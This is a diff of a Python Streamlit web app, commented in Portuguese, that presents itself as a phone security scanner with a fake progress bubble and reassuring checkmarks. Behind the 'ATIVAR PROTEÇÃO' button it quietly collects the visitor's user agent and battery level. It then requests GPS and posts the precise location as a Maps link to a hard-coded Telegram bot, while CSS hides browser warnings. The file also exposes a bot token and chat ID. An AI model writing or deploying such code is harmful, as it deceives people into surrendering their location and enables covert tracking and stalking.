@@ -3,7 +3,7 @@ import requests
 import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# 1. CONEXÃO TELEGRAM
+# 1. CONFIGURAÇÕES TELEGRAM
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
@@ -12,17 +12,13 @@ def enviar_telegram(msg):
     try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
     except: pass
 
-st.set_page_config(page_title="Segurança Ativa", layout="centered")
+st.set_page_config(page_title="Sistema de Segurança", layout="centered")
 
-# 2. CSS: BOLHA + MATAR AVISOS AMARELOS
+# 2. CSS: BOLHA E REMOÇÃO DE AVISOS
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
-    /* SOME COM QUALQUER AVISO AMARELO OU MENSAGEM DE ESPERA DO SISTEMA */
-    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
-        display: none !important; 
-    }
-    
+    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
     .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
     .circle {
         width: 180px; height: 180px; border-radius: 50%;
@@ -36,54 +32,53 @@ st.markdown("""
     .pct-text { font-size: 45px; font-weight: bold; color: white; }
     div.stButton > button {
         background-color: #ffc107 !important; color: black !important;
-        font-weight: bold !important; width: 100%; height: 3.8em; border-radius: 12px; border: none;
+        font-weight: bold !important; width: 100%; height: 4em; border-radius: 10px; border: none;
     }
     </style>
 """, unsafe_allow_html=True)
 
-# 3. CAPTURA SILENCIOSA (DADOS DO APARELHO)
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='USER_AGENT_DATA')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BATTERY_DATA')
+# 3. CAPTURA DE DADOS (MODELO E BATERIA)
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')
 
 # 4. INTERFACE
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
-area_bolha = st.empty()
+caixa_bolha = st.empty()
 
 if 'clicou' not in st.session_state:
     st.session_state['clicou'] = False
 
-# Estado 1: Bolha em 4% esperando o dono apertar o botão
+# Bolha inicial
 if not st.session_state['clicou']:
-    with area_bolha.container():
+    with caixa_bolha.container():
         st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
 st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 5. O BOTÃO (DISPARA O POP-UP DE LOCALIZAÇÃO DO GOOGLE)
+# 5. O BOTÃO
 if st.button("🔴 ATIVAR PROTEÇÃO"):
     st.session_state['clicou'] = True
 
-# 6. LÓGICA APÓS O CLIQUE
+# 6. LÓGICA DE CAPTURA
 if st.session_state['clicou']:
-    # Chama o GPS (O navegador vai abrir o pop-up de permissão aqui)
+    # Esta função força a chamada do pop-up de precisão do Google
     loc = get_geolocation() 
     
     if loc and 'coords' in loc:
-        # SUCESSO: O usuário aceitou a localização
-        # Agora a bolha gira os números de 0% a 100%
-        for i in range(0, 101, 5):
-            area_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
-            time.sleep(0.04)
+        # Animação dos números se mexendo (0-100)
+        for p in range(0, 101, 10):
+            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
+            time.sleep(0.05)
         
-        # Envio dos dados completos
-        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
+        lat = loc['coords']['latitude']
+        lon = loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
         relatorio = (
             f"🛡️ SISTEMA ATIVADO\n\n"
-            f"📱 Aparelho: {ua[:55] if ua else 'N/A'}\n"
+            f"📱 Aparelho: {ua[:50] if ua else 'N/A'}\n"
             f"🔋 Bateria: {bat if bat else '--'}%\n"
             f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
         )
@@ -93,9 +88,8 @@ if st.session_state['clicou']:
         st.session_state['clicou'] = False
         st.stop()
     else:
-        # Se o pop-up apareceu e a pessoa ainda não clicou, a bolha mostra "..."
-        # Mas não aparece nenhum aviso amarelo na tela.
-        with area_bolha.container():
+        # Se o botão foi apertado mas o GPS ainda não respondeu (exatamente o que ocorre no vídeo)
+        with caixa_bolha.container():
             st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">...</div></div></div>', unsafe_allow_html=True)
         time.sleep(1)
         st.rerun()
